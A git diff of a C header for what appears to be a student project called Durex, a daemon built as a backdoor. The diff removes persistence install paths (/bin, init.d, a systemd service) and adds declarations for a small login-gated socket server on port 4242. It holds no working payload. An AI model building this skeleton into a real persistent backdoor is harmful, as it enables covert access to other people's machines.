@@ -6,39 +6,58 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
-/*   Updated: 2018/07/13 14:30:54 by root             ###   ########.fr       */
+/*   Updated: 2018/07/15 05:20:56 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #ifndef DUREX_H
 # define DUREX_H
 
-# define DUREX_CREATE_FILE		"/bin/Durex"
-# define DUREX_INSTALL_FILE1	"/etc/init.d/Durex"
-# define DUREX_INSTALL_FILE2	"/etc/systemd/system/Durex.service"
-# define DUREX_LOCK_FILE		"/var/lock/durex.lock"
+# define CLIENT_MAX		3
+# define CLIENT_BUFF	128
 
-/* flock */
-# include <sys/file.h>
-/* close fork setsid dup2 chdir sleep write */
+/* memset strcpy */
+# include <string.h>
+/* select */
+# include <sys/time.h>
+# include <sys/types.h>
 # include <unistd.h>
 
-typedef struct	s_bin
+# define SERVER_ADDR	"localhost"
+# define SERVER_PORT	"4242"
+
+typedef struct	s_buff
 {
-	void		*data;
-	int			size;
-}				t_bin;
+	
+}				t_buff;
 
-typedef struct	s_env
+typedef struct	s_cl
 {
-	int			lock;
-	int			child;
-}				t_env;
+	int			fd;
+	int			logged;
+	char		rd[CLIENT_BUFF];
+	char		*rdHead;
+	char		*rdTail;
+	char		wr[CLIENT_BUFF];
+	char		*wrHead;
+	char		*wrTail;
+}				t_cl;
 
-t_env			e;
+typedef struct	s_sv
+{
+	int			fd;
+	fd_set		fdr;
+	fd_set		fdw;
+	t_cl		client[CLIENT_MAX];
+}				t_sv;
 
-int				durex();
-void			quitClearlyDaemon();
-void			daemonSigHandler(int sig);
+int				openServer(const char *addr, const char *port);
+void			serverAcceptConnections(t_sv *server);
+void			serverReadClient(t_cl *client);
+void			serverWriteClient(t_cl *client);
+void			quitServer(t_sv *server);
+void			clearClient(t_cl *client);
+
+void			clientWrite(char *str, t_cl *client);
 
 #endif /* DUREX_H */
